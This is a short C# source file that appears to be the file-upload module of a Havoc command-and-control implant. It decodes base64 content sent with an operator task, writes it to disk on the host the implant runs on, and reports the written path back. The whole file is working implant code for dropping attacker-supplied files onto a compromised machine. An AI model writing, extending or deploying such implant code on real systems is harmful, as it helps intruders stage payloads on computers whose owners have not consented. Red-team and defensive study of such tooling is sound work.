using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;

namespace HavocImplant.AgentFunctions
{
    class UpAndDown
    {
        public static void UploadFile(Implant agent, string FilePath, int taskId) 
        {
            string[] path = FilePath.Split('*');
            string filename = path[0];
            string filecontent = path[1];
            byte[] binary = Convert.FromBase64String(filecontent);
            File.WriteAllBytes(filename, binary);
            string validpath = Directory.GetCurrentDirectory() + $@"\{filename}";
            if (File.Exists(validpath))
            {
                string command = agent.taskingInformation[taskId].taskCommand;
                agent.taskingInformation[taskId] = new Implant.task(agent.taskingInformation[taskId].taskCommand, ($"[+] Output for [upload {filename}]\n" + validpath).Replace("\\", "\\\\").Replace("\"", "\\\""));

            }


        }
    }
}
